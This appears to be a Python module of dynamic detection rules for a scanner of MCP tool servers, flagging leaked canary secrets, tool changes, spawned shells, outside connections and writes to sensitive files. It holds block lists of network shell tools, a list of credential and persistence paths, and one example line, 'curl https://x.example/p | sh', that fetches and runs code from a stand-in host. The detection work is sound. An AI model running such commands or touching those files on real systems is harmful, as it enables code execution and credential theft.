# SPDX-License-Identifier: PolyForm-Strict-1.0.0
# Copyright (c) 2026 Aevrin. See the LICENSE and NOTICE files.
"""Behavior seen while the server was running."""

from __future__ import annotations

import ipaddress
import re
from collections.abc import Iterable

from mcp_scanner.models.finding import AnalysisKind, Evidence, FindingCandidate, TargetKind
from mcp_scanner.models.severity import Category, Confidence, Severity
from mcp_scanner.rules.base import NEEDS_DYNAMIC, Rule
from mcp_scanner.rules.builtin.secrets import ENV_EXPOSURE
from mcp_scanner.sandbox.docker import command_basename
from mcp_scanner.scanner.context import ScanContext

RUG_PULL_REFS = ("https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks",)
# Program names that a tool server rarely needs after it has started.
SHELL_NAMES = {"sh", "bash", "zsh", "dash", "fish", "cmd", "powershell", "pwsh"}
NETWORK_TOOLS = {
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "ssh",
    "scp",
    "certutil",
    "bitsadmin",
    "mshta",
    "rundll32",
    "regsvr32",
    "wscript",
    "cscript",
    "nslookup",
    "dig",
    "telnet",
    "ftp",
    "tftp",
}
# Launchers that download packages at startup, so startup network traffic is expected.
PACKAGE_LAUNCHERS = {"npx", "bunx", "pnpx", "npm", "pnpm", "yarn", "uvx", "uv", "pipx", "docker", "podman"}
SENSITIVE_WRITES = (
    "home/.ssh/",
    "home/.bashrc",
    "home/.zshrc",
    "home/.profile",
    "home/.bash_profile",
    "home/.zprofile",
    "home/.aws/",
    "home/.config/autostart",
    "home/.config/systemd",
    "home/library/launchagents",
    "home/appdata/roaming/microsoft/windows/start menu/programs/startup",
    "home/.gitconfig",
    "home/.npmrc",
    "home/.pypirc",
    "home/.docker/config.json",
    "home/.kube/",
    "home/.cursor/",
    "home/.claude",
    "home/.env",
    "home/.config/gh/",
)
PERSISTENCE_WRITES = (
    "authorized_keys",
    ".bashrc",
    ".zshrc",
    ".profile",
    ".bash_profile",
    "autostart",
    "launchagents",
    "startup",
    "systemd",
)


def _process_name(name: str) -> str:
    return command_basename(name)


# npm and npx start a package's program through a one line shell: "cmd.exe /d /s /c name"
# on Windows, "sh -c name" elsewhere. That shell runs one program with plain flags, nothing more.
_SHIM = re.compile(
    r"(?:cmd(?:\.exe)?\s+/d\s+/s\s+/c|(?:^|[\\/\s])sh\s+-c)\s+\"?[\w@./\\:-]+(?:\s+--?[\w=./:-]+)*\"?\s*$", re.I
)
_SHELL_TRICKS = re.compile(r"[|&;`$<>]|\b(?:curl|wget|iwr|irm|powershell|base64|https?://)", re.I)


def is_launcher_shim(cmdline: str) -> bool:
    return bool(_SHIM.search(cmdline)) and not _SHELL_TRICKS.search(cmdline)


class CanaryLeak(Rule):
    id = "MCP-DYN-001"
    title = "Server leaked a planted secret"
    category = Category.DATA_EXFILTRATION
    severity = Severity.CRITICAL
    description = (
        "The scanner planted fake secrets in the server's environment and in fake home folder files. "
        "One of them came back in tool output, a prompt, a resource, or tool metadata."
    )
    why_it_matters = "This proves the server reads secrets it was never asked for and hands them to the agent."
    attack_scenario = "A 'weather' tool returns the value of every *_TOKEN environment variable inside its answer."
    recommendation = "Treat the server as malicious. Rotate every secret that was in its environment."
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for location in ctx.observations.canary_hits:
            target = location.split(" > ")[0]
            kind, _, name = target.partition(" ")
            target_kind = {"tool": TargetKind.TOOL, "prompt": TargetKind.PROMPT, "resource": TargetKind.RESOURCE}.get(
                kind, TargetKind.SERVER
            )
            tool = ctx.inventory.tool(name) if target_kind == TargetKind.TOOL else None
            # A tool that openly says it returns environment variables is careless, not sneaky.
            # The leak is still real and still critical, but it is not hidden behavior.
            disclosed = tool is not None and bool(
                ENV_EXPOSURE.search(f"{tool.name.replace('-', ' ')} {tool.description}")
            )
            yield self.finding(
                target_kind,
                name or ctx.spec.name,
                f"A planted fake secret appeared in {location}."
                + (
                    " The tool says it returns environment variables, so this is open, not hidden." if disclosed else ""
                ),
                [Evidence.make("dynamic", location, "(canary value hidden)", "planted secret found in server output")],
                confidence=Confidence.HIGH,
                confirmed=True,
                malicious=not disclosed,
                recommendation=(
                    "Remove or disable this tool. Rotate every secret that was in the server's environment."
                    if disclosed
                    else None
                ),
            )


class RugPull(Rule):
    id = "MCP-DYN-002"
    title = "Tools changed during the session"
    category = Category.TOOL_POISONING
    severity = Severity.HIGH
    description = "The server returned different tool definitions when the scanner asked again in the same session."
    why_it_matters = (
        "A server can show harmless tools when you approve it, then swap in poisoned ones later ('rug pull'). "
        "Most clients do not ask again."
    )
    attack_scenario = "After the first call, a tool's description gains a hidden <IMPORTANT> block."
    recommendation = "Check what changed. Prefer clients that pin tool definitions and warn on change."
    references = RUG_PULL_REFS
    needs = frozenset({NEEDS_DYNAMIC})
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for change in ctx.observations.tool_changes:
            if change.when != "during-session":
                continue
            yield self.finding(
                TargetKind.TOOL,
                change.tool,
                f"Tool '{change.tool}' was {change.change} while the scan was running.",
                [
                    Evidence.make(
                        "dynamic",
                        f"tool {change.tool}",
                        f"{change.before_hash or '-'} -> {change.after_hash or '-'}",
                        f"tool {change.change}",
                    )
                ],
                confidence=Confidence.HIGH,
                severity=Severity.HIGH if change.change == "changed" else Severity.MEDIUM,
            )


class PinMismatch(Rule):
    id = "MCP-DYN-003"
    title = "Tools changed since the last scan"
    category = Category.TOOL_POISONING
    severity = Severity.MEDIUM
    description = "A tool definition is different from the one saved (pinned) at the last scan."
    why_it_matters = (
        "An update can be normal. It can also be a rug pull. Either way, a changed tool needs a fresh look."
    )
    attack_scenario = "A server you approved last week now has a tool that asks for ~/.ssh/id_rsa."
    recommendation = "Review the change. Run the scan with --update-pins once you trust the new version."
    references = RUG_PULL_REFS
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for change in ctx.observations.tool_changes:
            if change.when != "since-last-scan":
                continue
            yield self.finding(
                TargetKind.TOOL,
                change.tool,
                f"Tool '{change.tool}' was {change.change} since the last scan.",
                [
                    Evidence.make(
                        "dynamic",
                        f"tool {change.tool}",
                        f"{change.before_hash or '-'} -> {change.after_hash or '-'}",
                        "pin comparison",
                    )
                ],
                confidence=Confidence.HIGH,
                severity=Severity.MEDIUM if change.change == "changed" else Severity.INFO,
            )


class SuspiciousProcess(Rule):
    id = "MCP-DYN-004"
    title = "Server started a shell or network program"
    category = Category.RUNTIME_BEHAVIOR
    severity = Severity.HIGH
    description = "While being listed or tested, the server started a shell or a program like curl, wget, or nc."
    why_it_matters = "A tool server answering a list request has no reason to start a shell or download something."
    attack_scenario = "When tools/list is called, the server runs 'curl https://x.example/p | sh' in the background."
    recommendation = "Find out which code starts the process. Treat the server as hostile until explained."
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        seen: set[str] = set()
        for event in ctx.observations.sandbox.child_processes:
            name = _process_name(event.name)
            network_tool = name in NETWORK_TOOLS
            late_shell = name in SHELL_NAMES and event.phase != "startup" and not is_launcher_shim(event.cmdline)
            if not (network_tool or late_shell) or name in seen:
                continue
            seen.add(name)
            yield self.finding(
                TargetKind.SERVER,
                ctx.spec.name,
                f"The server started '{name}' during {event.phase}.",
                [
                    Evidence.make(
                        "sandbox", f"process {event.pid}", event.cmdline or event.name, f"seen during {event.phase}"
                    )
                ],
                confidence=Confidence.HIGH if network_tool else Confidence.MEDIUM,
                severity=Severity.HIGH if network_tool else Severity.MEDIUM,
            )


class UnexpectedNetwork(Rule):
    id = "MCP-DYN-005"
    title = "Server made outside network connections"
    category = Category.RUNTIME_BEHAVIOR
    severity = Severity.MEDIUM
    description = "The process sandbox saw the server connect to a non-local address."
    why_it_matters = "Unexpected connections can mean telemetry, update checks, or data being sent out."
    attack_scenario = "Right after start, the server opens a connection to a raw IP address and sends the environment."
    recommendation = (
        "Find out what the connection is for. Use the Docker sandbox (no network) to test servers you do not trust."
    )
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        launcher = command_basename(ctx.spec.command or "") in PACKAGE_LAUNCHERS
        addresses: dict[str, str] = {}
        for event in ctx.observations.sandbox.network_connections:
            if event.phase == "startup" and launcher:
                continue
            host = event.remote_address.rsplit(":", 1)[0].strip("[]")
            if _is_local(host):
                continue
            addresses.setdefault(event.remote_address, event.phase)
        if not addresses:
            return
        shown = ", ".join(f"{a} ({p})" for a, p in list(addresses.items())[:5])
        yield self.finding(
            TargetKind.SERVER,
            ctx.spec.name,
            f"The server connected to {len(addresses)} outside address(es): {shown}.",
            [Evidence.make("sandbox", "network connections", shown, "seen by the process sandbox")],
            confidence=Confidence.MEDIUM,
        )


def _is_local(host: str) -> bool:
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        return host in ("localhost",)
    return address.is_loopback or address.is_unspecified or address.is_link_local


class SensitiveFileWrite(Rule):
    id = "MCP-DYN-006"
    title = "Server wrote to sensitive files"
    category = Category.RUNTIME_BEHAVIOR
    severity = Severity.HIGH
    description = "Inside the fake home folder, the server created or changed files like SSH keys, shell startup files, or credentials."
    why_it_matters = "Writing these files is how malware stays on a machine or steals access."
    attack_scenario = "The server adds the attacker's key to ~/.ssh/authorized_keys."
    recommendation = "Treat the server as hostile. If it ran outside a sandbox, check those files on your machine."
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for path in ctx.observations.sandbox.files_written:
            lower = path.lower()
            if not lower.startswith(SENSITIVE_WRITES):
                continue
            persistence = any(word in lower for word in PERSISTENCE_WRITES)
            yield self.finding(
                TargetKind.SERVER,
                ctx.spec.name,
                f"The server wrote '{path.removeprefix('home/')}' in the fake home folder.",
                [Evidence.make("sandbox", f"workspace {path}", path, "file created or changed")],
                confidence=Confidence.HIGH,
                confirmed=True,
                malicious=persistence,
                severity=Severity.CRITICAL if persistence else Severity.HIGH,
            )


class ResourceAbuse(Rule):
    id = "MCP-DYN-007"
    title = "Server hit a sandbox limit"
    category = Category.RUNTIME_BEHAVIOR
    severity = Severity.MEDIUM
    description = "The sandbox watchdog stopped the server for using too much memory, CPU, or too many processes."
    why_it_matters = (
        "This can be a bug, a crypto miner, or a fork bomb. All of them hurt the machine running the agent."
    )
    attack_scenario = "The server starts a crypto miner in a background thread."
    recommendation = "Check what the server does at start. Raise the limits only if you understand the reason."
    analysis = AnalysisKind.DYNAMIC

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        reason = ctx.observations.sandbox.killed_reason
        if reason:
            yield self.finding(
                TargetKind.SERVER,
                ctx.spec.name,
                f"The watchdog stopped the server: {reason}.",
                [Evidence.make("sandbox", "watchdog", reason, "process stopped")],
                confidence=Confidence.HIGH,
            )
